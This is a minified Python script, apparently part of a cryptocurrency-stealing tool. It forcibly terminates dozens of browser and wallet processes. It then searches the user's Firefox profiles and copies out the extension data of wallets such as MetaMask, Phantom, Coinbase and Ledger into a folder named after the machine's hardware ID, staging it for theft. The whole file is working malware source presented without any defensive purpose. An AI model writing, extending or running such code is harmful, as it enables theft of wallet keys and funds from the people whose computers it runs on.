_M='uniswap.exe'
_L='trustwallet.exe'
_K='coinomi.exe'
_J='armory.exe'
_I='avant.exe'
_H='k-meleon.exe'
_G='gnome-web.exe'
_F='lunascape.exe'
_E='falkon.exe'
_D='qutebrowser.exe'
_C='brave.exe'
_B=True
_A='Not found'
import os,shutil,uuid,time,psutil,time
browser_processes=['chrome.exe','msedge.exe','opera.exe',_C,'vivaldi.exe','yandex.exe','slimjet.exe','epic.exe','dragon.exe','centbrowser.exe',_D,_E,'whale.exe','iron.exe','torch.exe','coccoc.exe','polarity.exe','javelin.exe','orbit.exe','chedot.exe',_F,'otter.exe','palemoon.exe','tutanota.exe','duckduckgo.exe','safeguard.exe','xbrowser.exe','medeanalytics.exe','tinfoil.exe','webcat.exe','basilisk.exe','tor.exe','flynx.exe','librewolf.exe','seamonkey.exe','midori.exe',_G,'surf.exe',_D,'qute-browser.exe','otter-browser.exe','pale-moon.exe','arora.exe','qupzilla.exe','kometa.exe',_H,_I,_F,'puffin.exe','sleipnir.exe','epiphany.exe','firefox.exe',_E,'librefox.exe',_G,'webpositive.exe','nexx.exe',_H,_I,'ibrowsr.exe','superbird.exe','rockmelt.exe','hotdog.exe','freedom.exe','flashpeak.exe','slimbrowser.exe','nanoweb.exe','datafox.exe','cyberfox.exe','eset.exe','reborn.exe','charm.exe','fossa.exe','penguin.exe','novel.exe','celtic.exe','polyweb.exe']
wallet_processes=['bitcoin-qt.exe','zcashd.exe',_J,'bytecoin.exe','jaxx.exe','exodus.exe','geth.exe','electrum.exe','atomic.exe','guarda.exe',_K,_L,'dapper.exe','zerion.exe','argent.exe','curve.exe','sushiswap.exe',_M,'1inch.exe','blockchain.exe','mycelium.exe','paxful.exe','celo.exe','nexo.exe',_C,'metamask.exe','bancor.exe','pillar.exe',_L,'kinesis.exe','ripple.exe','ledger-live.exe','trezor.exe',_J,'libra.exe',_M,'coinbase.exe','crypto.exe','zengo.exe','bitpay.exe','bitbns.exe',_K,'blockchain.info.exe','smartbit.exe','bitcoin-cash.exe','stellar.exe','dash.exe','monero.exe','vechain.exe','terra.exe','algorand.exe','tezos.exe','hedera.exe','filecoin.exe','safepal.exe','horizon.exe','bittrex.exe','bitstamp.exe','gate.io.exe','kucoin.exe','okex.exe','pancakeswap.exe']
def kill_processes(process_names,attempts=25,delay=0):
	C='pid';B='name'
	for D in range(attempts):
		print(f"Attempt {D+1} to kill processes...")
		for A in psutil.process_iter([C,B]):
			try:
				if A.info[B].lower()in[A.lower()for A in process_names]:print(f"Killing process: {A.info[B]} (PID: {A.info[C]})");A.terminate()
			except(psutil.NoSuchProcess,psutil.AccessDenied,psutil.ZombieProcess):pass
		time.sleep(delay)
print('Killing browser processes...')
kill_processes(browser_processes)
print('Killing wallet processes...')
kill_processes(wallet_processes)
print('Done.')
time.sleep(1)
username=os.getlogin()
hwid=str(uuid.getnode())
firefox_profiles_path=f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
searches_path=f"C:\\Users\\{username}\\Documents"
hwid_folder_path=f"{searches_path}\\{hwid}"
firefox_folder_path=f"{hwid_folder_path}\\firefox"
keywords=['MetaMask','Binance','Phantom','Coinbase','Ronin','Exodus','Coin98','KardiaChain','TerraStation','Wombat','Harmony','Nami','MartianAptos','Braavos','XDEFI','Yoroi','TON','Authenticator','MetaMask_Edge','Tron','Trezor','Ledger','Mycelium','TrustWallet','Ellipal','Dapper','BitKeep','Argent','Blockchain Wallet','Zerion','Aave','Curve','SushiSwap','Uniswap','1inch']
def contains_keyword(name,keywords):return any(A.lower()in name.lower()for A in keywords)
try:os.makedirs(firefox_folder_path,exist_ok=_B)
except Exception:print(_A);exit(1)
try:
	profiles_found=False
	for profile in os.listdir(firefox_profiles_path):
		profile_path=os.path.join(firefox_profiles_path,profile)
		if os.path.isdir(profile_path):
			profiles_found=_B;extensions_path=os.path.join(profile_path,'extensions')
			if os.path.exists(extensions_path):
				extensions_found=False
				for item in os.listdir(extensions_path):
					item_path=os.path.join(extensions_path,item)
					if contains_keyword(item,keywords):
						extensions_found=_B
						if os.path.isfile(item_path):shutil.copy(item_path,firefox_folder_path)
						elif os.path.isdir(item_path):shutil.copytree(item_path,os.path.join(firefox_folder_path,item),dirs_exist_ok=_B)
				if not extensions_found:print(_A)
			else:print(_A)
	if not profiles_found:print(_A)
except Exception:print(_A)
print(f"Filtered extensions have been extracted to: {firefox_folder_path}")